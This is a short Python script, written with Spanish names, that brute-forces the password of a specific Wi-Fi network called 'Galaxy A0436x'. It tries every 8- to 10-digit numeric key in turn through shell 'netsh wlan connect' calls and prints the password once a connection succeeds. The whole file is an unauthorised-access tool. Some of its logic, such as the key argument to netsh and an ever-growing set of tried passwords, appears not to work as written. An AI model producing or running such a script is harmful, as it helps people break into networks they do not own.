import subprocess
import itertools

def decifrar():
    SSID = "Galaxy A0436x"
    caracteres = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"]
    usada = set()
    min_length = 8

    def generar_contraseñas():
        for length in range(min_length, len(caracteres) + 1):
            for contraseña in itertools.product(caracteres, repeat=length):
                yield "".join(contraseña)

    for PASSWORD in generar_contraseñas():
        if PASSWORD in usada:
            continue
        usada.add(PASSWORD)

        comando = f'netsh wlan connect name="{SSID}" ssid="{SSID}" key="{PASSWORD}"'
        resultado = subprocess.run(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        if resultado.returncode == 0:
            resultado_check = subprocess.run(["netsh", "wlan", "show", "interfaces"], shell=True, stdout=subprocess.PIPE)
            if "Conectado" in resultado_check.stdout.decode():
                print(f"Conectado a la red Wi-Fi: {SSID} con la contraseña: {PASSWORD}")
                break
        else:
            print(f"Error al conectarse a la red Wi-Fi con la contraseña: {PASSWORD}")

if __name__ == "__main__":
    decifrar()
